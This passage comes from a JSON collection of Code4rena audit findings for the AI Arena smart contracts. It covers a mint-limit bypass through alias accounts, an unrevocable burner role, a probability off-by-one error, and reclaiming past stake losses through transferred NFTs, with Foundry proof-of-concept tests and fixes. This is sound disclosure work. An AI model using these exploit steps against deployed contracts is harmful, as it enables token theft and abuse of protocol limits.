treasuryAddress, price);\n  165:                  if (success) {\n  166:                      if (dailyAllowanceReplenishTime[msg.sender][tokenId] <= block.timestamp) {\n  167:                          _replenishDailyAllowance(tokenId);\n  168:                      }\n  169:                      allowanceRemaining[msg.sender][tokenId] -= quantity;\n  170:                      if (allGameItemAttributes[tokenId].finiteSupply) {\n  171:                          allGameItemAttributes[tokenId].itemsRemaining -= quantity;\n  172:                      }\n  173:                      _mint(msg.sender, tokenId, quantity, bytes(\"random\"));\n  174:                      emit BoughtItem(msg.sender, tokenId, quantity);\n  175:                  }\n  176:              }\n```\n</details>\n\nMissing check:\n\n```js\n  File: src/GameItems.sol\n\n  291:              function safeTransferFrom(\n  292:                  address from, \n  293:                  address to, \n  294:                  uint256 tokenId,\n  295:                  uint256 amount,\n  296:                  bytes memory data\n  297:              ) \n  298:                  public \n  299:                  override(ERC1155)\n  300:              {\n  301:                  require(allGameItemAttributes[tokenId].transferable);\n  302:                  super.safeTransferFrom(from, to, tokenId, amount, data);\n  303:              }\n```\n\n**Note:** This could also lead to a situation where a NRN whale having enough funds can buy the complete supply of the game items within minutes by using his multiple alias accounts.\n\n### Proof of Concept\n\n*   Alice *(ownerAddress)* buys 10 batteries. She can't buy anymore until 1 day has passed.\n*   Alice transfers some of her NRN to Bob *(Alice's alternate account)*.\n*   Bob buys 10 batteries and transfers them to Alice, bypassing the constraints.\n\nAdd the following inside `test/GameItems.t.sol` and run with `forge test --mt test_MintGameItems_FromMultipleAccs_ThenTransfer -vv`:\n\n```js\n    function test_MintGameItems_FromMultipleAccs_ThenTransfer() public {\n        // _ownerAddress's alternate account\n        address aliasAccount1 = makeAddr(\"aliasAccount1\");\n\n        _fundUserWith4kNeuronByTreasury(_ownerAddress);\n        _gameItemsContract.mint(0, 10); //paying 10 $NRN for 10 batteries\n        assertEq(_gameItemsContract.balanceOf(_ownerAddress, 0), 10);\n        \n        // transfer some $NRN to alias Account\n        _neuronContract.transfer(aliasAccount1, 10 * 10 ** 18);\n\n        vm.startPrank(aliasAccount1);\n        _gameItemsContract.mint(0, 10); //paying 10 $NRN for 10 batteries\n        assertEq(_gameItemsContract.balanceOf(aliasAccount1, 0), 10);\n\n        // transfer these game items to _ownerAddress\n        _gameItemsContract.safeTransferFrom(aliasAccount1, _ownerAddress, 0, 10, \"\");\n\n        assertEq(_gameItemsContract.balanceOf(_ownerAddress, 0), 20);\n    }\n```\n\n### Tools used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nAdd the same check inside `safeTransferFrom()` too:\n\n```diff\n  File: src/GameItems.sol\n\n  291:              function safeTransferFrom(\n  292:                  address from, \n  293:                  address to, \n  294:                  uint256 tokenId,\n  295:                  uint256 amount,\n  296:                  bytes memory data\n  297:              ) \n  298:                  public \n  299:                  override(ERC1155)\n  300:              {\n  301:                  require(allGameItemAttributes[tokenId].transferable);\n+                       require(dailyAllowanceReplenishTime[to][tokenId] <= block.timestamp || amount <= allowanceRemaining[to][tokenId], \"Cannot bypass constraints via alias accounts\");  \n  302:                  super.safeTransferFrom(from, to, tokenId, amount, data);\n  303:              }\n```\n\n**[hickuphh3 (judge) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/43#issuecomment-1982315463):**\n > Agree with the issue. The main impact is about bypassing replenishing / minting limits for **a specific account** by minting batteries / redeeming passes with multiple accounts & transferring all to that 1 account for consumption || transferring fighter NFTs back and forth across multiple wallets.\n\n\n\n***\n\n",
      "summary": "\nThe mint() function in GameItems.sol prevents users from minting more than 10 game items in one day. However, this constraint can be bypassed because a similar check is missing in the safeTransferFrom() function. This means that a user can use multiple accounts to buy the entire supply of game items within minutes. To demonstrate this, a test was run using two accounts, where one account bought 10 batteries and transferred them to the other account, bypassing the constraint. The recommended solution is to add the same check in the safeTransferFrom() function to prevent this bypass.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/43",
      "tags": [],
      "finders": [
        "Kalogerone",
        "PedroZurdo",
        "ladboy233",
        "givn",
        "t0x1c",
        "Greed",
        "djxploit",
        "zaevlad",
        "MidgarAudits",
        "lanrebayode77",
        "MrPotatoMagic",
        "ZanyBonzy",
        "visualbits",
        "SpicyMeatball",
        "btk",
        "VAD37",
        "lil\\_eth",
        "Draiakoo",
        "0xDetermination",
        "MatricksDeCoder",
        "1",
        "2",
        "Velislav4o",
        "0xCiphky",
        "Shubham",
        "forkforkdog"
      ]
    },
    {
      "id": "32198",
      "title": "[M-08] Burner role cannot be revoked",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-02-ai-arena/blob/f2952187a8afc44ee6adc28769657717b498b7d4/src/GameItems.sol#L185-L188> \n\n<https://github.com/code-423n4/2024-02-ai-arena/blob/f2952187a8afc44ee6adc28769657717b498b7d4/src/GameItems.sol#L242-L245>\n\nIn `GameItems::setAllowedBurningAddresses` the admin can update the `allowedBurningAddresses` mapping.\n\n```solidity\n    function setAllowedBurningAddresses(address newBurningAddress) public {\n        require(isAdmin[msg.sender]);\n        allowedBurningAddresses[newBurningAddress] = true;\n    }\n```\n\nThis mapping is used to check if the `msg.sender` has permission to burn specific amount of game items from an account. This can happen through the `burn` function.\n\n```solidity\n    function burn(address account, uint256 tokenId, uint256 amount) public {\n        require(allowedBurningAddresses[msg.sender]);\n        _burn(account, tokenId, amount);\n    }\n```\n\nHowever `setAllowedBurningAddresses()` works only one way. I mean that the admin can give permission, but not revoke it.\n\n### Proof of Concept\n\nImagine the following scenario. Admin calls `setAllowedBurningAddresses` with wrong address. Now this address has the permission to burn any token from any user. Now no one can remove the wrong address from the mapping.\n\n### Recommended Mitigation Steps\n\nUse `adjustAdminAccess` function as an example:\n\n```solidity\n    function adjustAdminAccess(address adminAddress, bool access) external {\n        require(msg.sender == _ownerAddress);\n        isAdmin[adminAddress] = access;\n    }\n```\n\nSo the new `setAllowedBurningAddresses` function should look something like this:\n\n```solidity\n    function adjustBurningAccess(address burningAddress, bool access) public {\n        require(isAdmin[msg.sender]);\n        allowedBurningAddresses[burningAddress] = access;\n    }\n```\n\nNow even if the admin sets the wrong address, he can immediately change it.\n\n**[hickuphh3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/47#issuecomment-1984979002):**\n > Similar to [M-02](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1507), but the root causes are different even though the effect is the same.\n\n**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**\n> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/18\n\n**Status:** Not fully mitigated. Full details in report from [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/52), and also included in the [Mitigation Review](#mitigation-review) section below.\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a vulnerability in the `GameItems` contract where the admin is able to give permission to burn game items, but is unable to revoke it. This means that if the admin accidentally gives permission to the wrong address, that address will have the ability to burn any token from any user. This can be fixed by implementing a new function, `adjustBurningAccess`, which allows the admin to change the permission for burning addresses. The severity of this vulnerability has been decreased to medium and a partial mitigation has been implemented, but it is not fully resolved yet. More details can be found in the mitigation review section of the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/47",
      "tags": [],
      "finders": [
        "0xblackskull",
        "josephdara",
        "MrPotatoMagic",
        "Rolezn",
        "lil\\_eth",
        "1",
        "vnavascues",
        "2",
        "sobieski",
        "CodeWasp",
        "Sabit",
        "Timenov",
        "SovaSlava",
        "andywer",
        "0x11singh99",
        "MidgarAudits",
        "btk"
      ]
    },
    {
      "id": "32197",
      "title": "[M-07] Erroneous probability calculation in physical attributes can lead to significant issues",
      "impact": "MEDIUM",
      "content": "\nTo determine what physical attributes a user gets first we obtain a `rarityRank` which is computed from the DNA.\n\n[AiArenaHelper.sol#L106-L110](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/AiArenaHelper.sol#L106C1-L110C18)\n\n```solidity\n                } else {\n                    uint256 rarityRank = (dna / attributeToDnaDivisor[attributes[i]]) % 100;\n                    uint256 attributeIndex = dnaToIndex(generation, rarityRank, attributes[i]);\n                    finalAttributeProbabilityIndexes[i] = attributeIndex;\n                }\n```\n\nHere since we use `% 100` operation is used, the range of `rarityRank` would be \\[0,99].\n\nThis `rarityRank` is used in the `dnaToIndex` to determine the final attribute of the part.\n\n[AiArenaHelper.sol#L165-L186](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/AiArenaHelper.sol#L165C1-L186C6)\n\n```solidity\n     /// @dev Convert DNA and rarity rank into an attribute probability index.\n     /// @param attribute The attribute name.\n     /// @param rarityRank The rarity rank.\n     /// @return attributeProbabilityIndex attribute probability index.\n    function dnaToIndex(uint256 generation, uint256 rarityRank, string memory attribute) \n        public \n        view \n        returns (uint256 attributeProbabilityIndex) \n    {\n        uint8[] memory attrProbabilities = getAttributeProbabilities(generation, attribute);\n        \n        uint256 cumProb = 0;\n        uint256 attrProbabilitiesLength = attrProbabilities.length;\n        for (uint8 i = 0; i < attrProbabilitiesLength; i++) {\n            cumProb += attrProbabilities[i];\n            if (cumProb >= rarityRank) {\n                attributeProbabilityIndex = i + 1;\n                break;\n            }\n        }\n        return attributeProbabilityIndex;\n    }\n```\n\nThere is however, a very subtle bug in the calculation above due to the use of `cumProb >= rarityRank` as opposed to `cumProb > rarityRank`.\n\nTo explain the above, I will perform a calculation using a simple example. Let's say we only have 2 possible attributes and the `attrProbabilities` is \\[50, 50].\n\n1.  First iteration, when `i = 0`, we have `cumProb = 50`, for the `if (cumProb >= rarityRank)` to be entered the range of values `rarityRank` can be is \\[0, 50]. Therefore there is a 51\\% chance of obtaining this attribute\n\n2.  Next iteration, when `i = 1`, we have `cumProb = 100`, for the `if (cumProb >= rarityRank)` to be entered the range of values `rarityRank` can be is \\[51, 99]. Therefore there is a 49\\% chance of obtaining this attribute.\n\nThis means that for values in the first index, the probability is 1\\% greater than intended and for values in the last index the probability is 1\\% lesser than intended. This can be significant in certain cases, let us run through two of them.\n\n**Case 1: The first value in `attrProbabilities` is 1.**\n\nIf the first value in `attrProbabilities` is 1. Let's say \\[1, 99].\n\nThen in reality if we perform the calculation above we get the following results:\n\n1.  First iteration, when `i = 0`, we have `cumProb = 1`, for the `if (cumProb >= rarityRank)` to be entered the range of values `rarityRank` can be is \\[0, 1]. Therefore there is a 2\\% chance of obtaining this attribute\n\n2.  Next iteration, when `i = 1`, we have `cumProb = 100`, for the `if (cumProb >= rarityRank)` to be entered the range of values `rarityRank` can be is \\[2, 99]. Therefore there is a 98\\% chance of obtaining this attribute.\n\nThen we have twice the chance of getting the rarer item, which would make it twice as common, thus devaluing it.\n\n**Case 2: The last value in `attrProbabilities` is 1.**\n\nIf the last value in `attrProbabilities` is 1. Let's say \\[99, 1].\n\nThen in reality if we perform the calculation above we get the following results:\n\n1.  First iteration, when `i = 0`, we have `cumProb = 99`, for the `if (cumProb >= rarityRank)` to be entered the range of values `rarityRank` can be is \\[0, 99]. Therefore we will always enter the `if (cumProb >= rarityRank)` block.\n\nThen it would be impossible (0\\% chance) to obtain the 1\\% item.\n\n### Recommended Mitigation Steps\n\nIt should be `cumProb > rarityRank`. Going back to our example of \\[50, 50], if it were `cumProb > rarityRank`. Then we will get the following results:\n\n1.  First iteration, when `i = 0`, we have `cumProb = 50`, for the `if (cumProb > rarityRank)` to be entered the range of values `rarityRank` can be is \\[0, 49]. Therefore there is a 50\\% chance of obtaining this attribute\n\n2.  Next iteration, when `i = 1`, we have `cumProb = 100`, for the `if (cumProb > rarityRank)` to be entered the range of values `rarityRank` can be is \\[50, 99]. Therefore there is a 50\\% chance of obtaining this attribute.\n\nThus the above recommended mitigation is correct.\n\n**[hickuphh3 (judge) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/112#issuecomment-1977903075):**\n > Valid issue: wrong inclusion of boundary skews the probability to one-side by 1\\%.<br>\n > The shift in probabilities will affect trait generation, which affects fighter valuations.\n\n_Note: For full discussion, see [here](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/112)._\n\n\n\n***\n\n",
      "summary": "\nThe report explains a bug in the code that determines the physical attributes of a user in the AI Arena game. The bug occurs because of a subtle error in the calculation of the rarity rank, which is used to determine the final attribute of a part. The error is due to the use of `>=` instead of `>` in the calculation, resulting in a 1% difference in the probabilities. This can significantly affect the rarity and value of certain items in the game. The report recommends fixing the calculation to mitigate the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/112",
      "tags": [],
      "finders": [
        "BARW",
        "DanielArmstrong",
        "juancito",
        "fnanni",
        "haxatron"
      ]
    },
    {
      "id": "32196",
      "title": "[M-06] NFTs can be transferred even if StakeAtRisk remains, so the user's win cannot be recorded on the chain due to underflow, and can recover past losses that can't be recovered (steal protocol's token)",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-02-ai-arena/blob/1d18d1298729e443e14fea08149c77182a65da32/src/RankedBattle.sol#L285-L286><br>\n<https://github.com/code-423n4/2024-02-ai-arena/blob/1d18d1298729e443e14fea08149c77182a65da32/src/RankedBattle.sol#L495-L496>\n\nCannot record a user's victory on-chain, and it may be possible to recover past losses (which should impossible).\n\n### Proof of Concept\n\nIf you lose in a game, `_addResultPoints` is called, and the staked tokens move to the StakeAtRisk.\n\n<details>\n\n```solidity\nfunction _addResultPoints(\n    uint8 battleResult, \n    uint256 tokenId, \n    uint256 eloFactor, \n    uint256 mergingPortion,\n    address fighterOwner\n) \n    private \n{\n    uint256 stakeAtRisk;\n    uint256 curStakeAtRisk;\n    uint256 points = 0;\n\n    /// Check how many NRNs the fighter has at risk\n    stakeAtRisk = _stakeAtRiskInstance.getStakeAtRisk(tokenId);\n    ...\n\n    /// Potential amount of NRNs to put at risk or retrieve from the stake-at-risk contract\n@>  curStakeAtRisk = (bpsLostPerLoss * (amountStaked[tokenId] + stakeAtRisk)) / 10**4;\n    if (battleResult == 0) {\n        /// If the user won the match\n        ...\n    } else if (battleResult == 2) {\n        /// If the user lost the match\n\n        /// Do not allow users to lose more NRNs than they have in their staking pool\n        if (curStakeAtRisk > amountStaked[tokenId]) {\n@>          curStakeAtRisk = amountStaked[tokenId];\n        }\n        if (accumulatedPointsPerFighter[tokenId][roundId] > 0) {\n            ...\n        } else {\n            /// If the fighter does not have any points for this round, NRNs become at risk of being lost\n@>          bool success = _neuronInstance.transfer(_stakeAtRiskAddress, curStakeAtRisk);\n            if (success) {\n@>              _stakeAtRiskInstance.updateAtRiskRecords(curStakeAtRisk, tokenId, fighterOwner);\n@>              amountStaked[tokenId] -= curStakeAtRisk;\n            }\n        }\n    }\n}\n```\n</details>\n\nIf a Fighter NFT has NRN tokens staked, that Fighter NFT is locked and cannot be transfered. When the tokens are unstaked and the remaining `amountStaked[tokenId]` becomes 0, the Fighter NFT is unlocked and it can be transfered. However, it does not check whether there are still tokens in the StakeAtRisk of the Fighter NFT.\n\n<details>\n\n```solidity\nfunction unstakeNRN(uint256 amount, uint256 tokenId) external {\n    require(_fighterFarmInstance.ownerOf(tokenId) == msg.sender, \"Caller does not own fighter\");\n    if (amount > amountStaked[tokenId]) {\n@>      amount = amountStaked[tokenId];\n    }\n    amountStaked[tokenId] -= amount;\n    globalStakedAmount -= amount;\n    stakingFactor[tokenId] = _getStakingFactor(\n        tokenId, \n        _stakeAtRiskInstance.getStakeAtRisk(tokenId)\n    );\n    _calculatedStakingFactor[tokenId][roundId] = true;\n    hasUnstaked[tokenId][roundId] = true;\n    bool success = _neuronInstance.transfer(msg.sender, amount);\n    if (success) {\n        if (amountStaked[tokenId] == 0) {\n@>          _fighterFarmInstance.updateFighterStaking(tokenId, false);\n        }\n        emit Unstaked(msg.sender, amount);\n    }\n}\n```\n</details>\n\nUnstaked Fighter NFTs can now be traded on the secondary market. Suppose another user buys this Fighter NFT with remaining StakeAtRisk.\n\nNormally, if you win a game, you can call `reclaimNRN` to get the tokens back from StakeAtRisk.\n\n<details>\n\n```solidity\nfunction _addResultPoints(\n    uint8 battleResult, \n    uint256 tokenId, \n    uint256 eloFactor, \n    uint256 mergingPortion,\n    address fighterOwner\n) \n    private \n{\n    uint256 stakeAtRisk;\n    uint256 curStakeAtRisk;\n    uint256 points = 0;\n\n    /// Check how many NRNs the fighter has at risk\n@>  stakeAtRisk = _stakeAtRiskInstance.getStakeAtRisk(tokenId);\n\n    ...\n    /// Potential amount of NRNs to put at risk or retrieve from the stake-at-risk contract\n@>  curStakeAtRisk = (bpsLostPerLoss * (amountStaked[tokenId] + stakeAtRisk)) / 10**4;\n    if (battleResult == 0) {\n        /// If the user won the match\n        ...\n\n        /// Do not allow users to reclaim more NRNs than they have at risk\n        if (curStakeAtRisk > stakeAtRisk) {\n@>          curStakeAtRisk = stakeAtRisk;\n        }\n\n        /// If the user has stake-at-risk for their fighter, reclaim a portion\n        /// Reclaiming stake-at-risk puts the NRN back into their staking pool\n@>      if (curStakeAtRisk > 0) {\n@>          _stakeAtRiskInstance.reclaimNRN(curStakeAtRisk, tokenId, fighterOwner);\n            amountStaked[tokenId] += curStakeAtRisk;\n        }\n        ...\n    } else if (battleResult == 2) {\n        ...\n    }\n}\n```\n</details>\n\nHowever, if a new user becomes the owner of the Fighter NFT, it does not work as intended.\n\nThe `_addResultPoints` might revert due to the underflow at `reclaimNRN`'s `amountLost[fighterOwner] -= nrnToReclaim`. Therefore, the new owner cannot record a victory on-chain with the purchased NFT until the end of this round.\n\n```solidity\nfunction getStakeAtRisk(uint256 fighterId) external view returns(uint256) {\n@>  return stakeAtRisk[roundId][fighterId];\n}\n\nfunction reclaimNRN(uint256 nrnToReclaim, uint256 fighterId, address fighterOwner) external {\n    require(msg.sender == _rankedBattleAddress, \"Call must be from RankedBattle contract\");\n    require(\n        stakeAtRisk[roundId][fighterId] >= nrnToReclaim, \n        \"Fighter does not have enough stake at risk\"\n    );\n\n    bool success = _neuronInstance.transfer(_rankedBattleAddress, nrnToReclaim);\n    if (success) {\n        stakeAtRisk[roundId][fighterId] -= nrnToReclaim;\n        totalStakeAtRisk[roundId] -= nrnToReclaim;\n@>      amountLost[fighterOwner] -= nrnToReclaim;\n        emit ReclaimedStake(fighterId, nrnToReclaim);\n    }\n}\n```\n\nEven if the new owner already has another NFT and has a sufficient amount of `amountLost[fighterOwner]`, there is a problem.\n\n*   Alice buy the NFT2(tokenId 2) from the secondary market, which has 30 stakeAtRisk.\n    *   stakeAtRisk of NFT2: 30\n    *   amountLost: 0\n*   Alice also owns the NFT1(tokenId 1) and has 100 stakeAtRisk in the same round.\n    *   stakeAtRisk of NFT1: 100\n    *   stakeAtRisk of NFT2: 30\n    *   amountLost: 100\n*   Alice wins with the NFT2 and reclaims 30 stakeAtRisk.\n    *   stakeAtRisk of NFT1: 100\n    *   stakeAtRisk of NFT2: 0\n    *   amountLost: 70\n*   If Alice tries to reclaim stakeAtRisk of NFT1, an underflow occurs and it reverts when remaining stakeAtRisk is 30.\n    *   stakeAtRisk of NFT1: 30\n    *   stakeAtRisk of NFT2: 0\n    *   amountLost: 0\n*   Alice will no longer be able to record a win for NFT1 due to underflow.\n\nThere is a problem even if the user owns a sufficient amount of `amountLost[fighterOwner]` and does not have stakeAtRisk of another NFT in the current round. In this case, the user can steal the protocol's token.\n\n*   Alice owns NFT1 and had 100 stakeAtRisk with NFT1 at past round.\n    *   Since the round has already passed, this loss of 100 NRN is a past loss that can no longer be recovered.\n    *   Since `amountLost[fighterOwner]` is a total amount regardless of rounds, it remains 100 even after the round.\n    *   stakeAtRisk of NFT1: 0 (current round)\n    *   amountLost: 100 (this should be unrecoverable)\n*   Alice buys NFT 2 from the secondary market, which has 100 stakeAtRisk.\n    *   stakeAtRisk of NFT1: 0\n    *   stakeAtRisk of NFT2: 100\n    *   amountLost: 100\n*   Alice wins with NFT 2 and reclaims 100.\n    *   stakeAtRisk of NFT1: 0\n    *   stakeAtRisk of NFT2: 0\n    *   amountLost: 0\n*   Alice recovers the past loss through NFT 2. Alice recovered past lost, which shouldn't be recovered, which means she steals the protocol's token.\n\nThis is PoC. You can add it to StakeAtRisk.t.sol and run it.\n\n*   testPoC1 shows that a user with `amountLost` 0 cannot record a victory with the purchased NFT due to underflow.\n*   testPoC2 shows that a user who already has stakeAtRisk due to another NFT in the same round can no longer record a win due to underflow.\n*   testPoC3 shows that a user can recover losses from a past round by using a purchased NFT.\n\n<details>\n\n```solidity\nfunction testPoC1() public {\n    address seller = vm.addr(3);\n    address buyer = vm.addr(4);\n    \n    uint256 stakeAmount = 3_000 * 10 ** 18;\n    uint256 expectedStakeAtRiskAmount = (stakeAmount * 100) / 100000;\n    _mintFromMergingPool(seller);\n    uint256 tokenId = 0;\n    assertEq(_fighterFarmContract.ownerOf(tokenId), seller);\n    _fundUserWith4kNeuronByTreasury(seller);\n    vm.prank(seller);\n    _rankedBattleContract.stakeNRN(stakeAmount, tokenId);\n    assertEq(_rankedBattleContract.amountStaked(tokenId), stakeAmount);\n    vm.prank(address(_GAME_SERVER_ADDRESS));\n    // loses battle\n    _rankedBattleContract.updateBattleRecord(tokenId, 50, 2, 1500, true);\n    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId), expectedStakeAtRiskAmount);\n\n    // seller unstake and sell NFT to buyer\n    vm.startPrank(seller);\n    _rankedBattleContract.unstakeNRN(_rankedBattleContract.amountStaked(tokenId), tokenId);\n    _fighterFarmContract.transferFrom(seller, buyer, tokenId);\n    vm.stopPrank();\n\n    // The buyer win battle but cannot write at onchain\n    vm.expectRevert(abi.encodeWithSignature(\"Panic(uint256)\", 0x11)); // expect arithmeticError (underflow)\n    vm.prank(address(_GAME_SERVER_ADDRESS));\n    _rankedBattleContract.updateBattleRecord(tokenId, 50, 0, 1500, true);\n\n}\n\nfunction testPoC2() public {\n    address seller = vm.addr(3);\n    address buyer = vm.addr(4);\n    \n    uint256 stakeAmount = 3_000 * 10 ** 18;\n    uint256 expectedStakeAtRiskAmount = (stakeAmount * 100) / 100000;\n    _mintFromMergingPool(seller);\n    uint256 tokenId = 0;\n    assertEq(_fighterFarmContract.ownerOf(tokenId), seller);\n    _fundUserWith4kNeuronByTreasury(seller);\n    vm.prank(seller);\n    _rankedBattleContract.stakeNRN(stakeAmount, tokenId);\n    assertEq(_rankedBattleContract.amountStaked(tokenId), stakeAmount);\n    vm.prank(address(_GAME_SERVER_ADDRESS));\n    // loses battle\n    _rankedBattleContract.updateBattleRecord(tokenId, 50, 2, 1500, true);\n    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId), expectedStakeAtRiskAmount);\n\n    // seller unstake and sell NFT to buyer\n    vm.startPrank(seller);\n    _rankedBattleContract.unstakeNRN(_rankedBattleContract.amountStaked(tokenId), tokenId);\n    _fighterFarmContract.transferFrom(seller, buyer, tokenId);\n    vm.stopPrank();\n\n    // The buyer have new NFT and loses with it\n    uint256 stakeAmount_buyer = 3_500 * 10 ** 18;\n    uint256 expectedStakeAtRiskAmount_buyer = (stakeAmount_buyer * 100) / 100000;\n\n    _mintFromMergingPool(buyer);\n    uint256 tokenId_buyer = 1;\n    assertEq(_fighterFarmContract.ownerOf(tokenId_buyer), buyer);\n\n    _fundUserWith4kNeuronByTreasury(buyer);\n    vm.prank(buyer);\n    _rankedBattleContract.stakeNRN(stakeAmount_buyer, tokenId_buyer);\n    assertEq(_rankedBattleContract.amountStaked(tokenId_buyer), stakeAmount_buyer);\n\n    // buyer loses with tokenId_buyer\n    vm.prank(address(_GAME_SERVER_ADDRESS));\n    _rankedBattleContract.updateBattleRecord(tokenId_buyer, 50, 2, 1500, true);\n    \n    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId_buyer), expectedStakeAtRiskAmount_buyer);\n    assertGt(expectedStakeAtRiskAmount_buyer, expectedStakeAtRiskAmount, \"buyer has more StakeAtRisk\");\n\n    // buyer win with bought NFT (tokenId 0)\n    vm.startPrank(address(_GAME_SERVER_ADDRESS));\n    for(uint256 i = 0; i < 1000; i++){\n        _rankedBattleContract.updateBattleRecord(tokenId, 50, 0, 1500, false);\n    }\n    vm.stopPrank();\n\n    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId), 0); // Reclaimed all stakeAtRisk of bought NFT(token 0)\n    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId_buyer), expectedStakeAtRiskAmount_buyer); // tokenId_buyer stakeAtRisk remains\n    assertEq(_stakeAtRiskContract.amountLost(buyer), expectedStakeAtRiskAmount_buyer - expectedStakeAtRiskAmount, \"remain StakeAtRisk\");\n\n    // the remain StakeAtRisk cannot be reclaimed even if buyer win with tokenId_buyer(token 1)\n    // and the win result of token 1 cannot be saved at onchain\n    vm.expectRevert(abi.encodeWithSignature(\"Panic(uint256)\", 0x11)); // expect arithmeticError (underflow)\n    vm.prank(address(_GAME_SERVER_ADDRESS));\n    _rankedBattleContract.updateBattleRecord(tokenId_buyer, 50, 0, 1500, false);\n}\n\nfunction testPoC3() public {\n    address seller = vm.addr(3);\n    address buyer = vm.addr(4);\n    \n    uint256 stakeAmount = 3_000 * 10 ** 18;\n    uint256 expectedStakeAtRiskAmount = (stakeAmount * 100) / 100000;\n\n    // The buyer have new NFT and loses with it\n    uint256 stakeAmount_buyer = 300 * 10 ** 18;\n    uint256 expectedStakeAtRiskAmount_buyer = (stakeAmount_buyer * 100) / 100000;\n\n    _mintFromMergingPool(buyer);\n    uint256 tokenId_buyer = 0;\n    assertEq(_fighterFarmContract.ownerOf(tokenId_buyer), buyer);\n\n    _fundUserWith4kNeuronByTreasury(buyer);\n    vm.prank(buyer);\n    _rankedBattleContract.stakeNRN(stakeAmount_buyer, tokenId_buyer);\n    assertEq(_rankedBattleContract.amountStaked(tokenId_buyer), stakeAmount_buyer);\n\n    // buyer loses with tokenId_buyer\n    vm.prank(address(_GAME_SERVER_ADDRESS));\n    _rankedBattleContract.updateBattleRecord(tokenId_buyer, 50, 2, 1500, true);\n\n    assertEq(_stakeAtRiskContract.stakeAtRisk(0, tokenId_buyer), expectedStakeAtRiskAmount_buyer);\n    assertGt(expectedStakeAtRiskAmount, expectedStakeAtRiskAmount_buyer, \"seller's token has more StakeAtRisk\");\n\n    // round 0 passed\n    // tokenId_buyer's round 0 StakeAtRisk is reset\n    vm.prank(address(_rankedBattleContract));\n    _stakeAtRiskContract.setNewRound(1);\n    assertEq(_stakeAtRiskContract.stakeAtRisk(1, tokenId_buyer), 0);\n\n    // seller mint token, lose battle and sell the NFT\n    _mintFromMergingPool(seller);\n    uint256 tokenId = 1;\n    assertEq(_fighterFarmContract.ownerOf(tokenId), seller);\n    _fundUserWith4kNeuronByTreasury(seller);\n    vm.prank(seller);\n    _rankedBattleContract.stakeNRN(stakeAmount, tokenId);\n    assertEq(_rankedBattleContract.amountStaked(tokenId), stakeAmount);\n    vm.prank(address(_GAME_SERVER_ADDRESS));\n    // loses battle\n    _rankedBattleContract.updateBattleRecord(tokenId, 50, 2, 1500, true);\n    assertEq(_stakeAtRiskContract.stakeAtRisk(1, tokenId), expectedStakeAtRiskAmount);\n\n    // seller unstake and sell NFT to buyer\n    vm.startPrank(seller);\n    _rankedBattleContract.unstakeNRN(_rankedBattleContract.amountStaked(tokenId), tokenId);\n    _fighterFarmContract.transferFrom(seller, buyer, tokenId);\n    vm.stopPrank();\n\n    \n    // buyer win with bought NFT (tokenId 0)\n    vm.startPrank(address(_GAME_SERVER_ADDRESS));\n    for(uint256 i = 0; i < 100; i++){\n        _rankedBattleContract.updateBattleRecord(tokenId, 50, 0, 1500, false);\n    }\n    vm.stopPrank();\n\n    assertEq(_stakeAtRiskContract.stakeAtRisk(1, tokenId), expectedStakeAtRiskAmount - expectedStakeAtRiskAmount_buyer); // Reclaimed all stakeAtRisk of bought NFT(token 1)\n    assertEq(_stakeAtRiskContract.stakeAtRisk(1, tokenId_buyer), 0);\n    assertEq(_stakeAtRiskContract.amountLost(buyer), 0, \"reclaimed old lost\");\n\n    // and the win result of token 1 cannot be saved at onchain anymore\n    vm.expectRevert(abi.encodeWithSignature(\"Panic(uint256)\", 0x11)); // expect arithmeticError (underflow)\n    vm.prank(address(_GAME_SERVER_ADDRESS));\n    _rankedBattleContract.updateBattleRecord(tokenId, 50, 0, 1500, false);\n\n}\n```\n</details>\n\n### Recommended Mitigation Steps\n\nTokens with a remaining StakeAtRisk should not be allowed to be exchanged.\n\n```diff\nfunction unstakeNRN(uint256 amount, uint256 tokenId) external {\n    require(_fighterFarmInstance.ownerOf(tokenId) == msg.sender, \"Caller does not own fighter\");\n    if (amount > amountStaked[tokenId]) {\n        amount = amountStaked[tokenId];\n    }\n    amountStaked[tokenId] -= amount;\n    globalStakedAmount -= amount;\n    stakingFactor[tokenId] = _getStakingFactor(\n        tokenId, \n        _stakeAtRiskInstance.getStakeAtRisk(tokenId)\n    );\n    _calculatedStakingFactor[tokenId][roundId] = true;\n    hasUnstaked[tokenId][roundId] = true;\n    bool success = _neuronInstance.transfer(msg.sender, amount);\n    if (success) {\n-       if (amountStaked[tokenId] == 0) {\n+       if (amountStaked[tokenId] == 0 && _stakeAtRiskInstance.getStakeAtRisk(tokenId) == 0) {\n            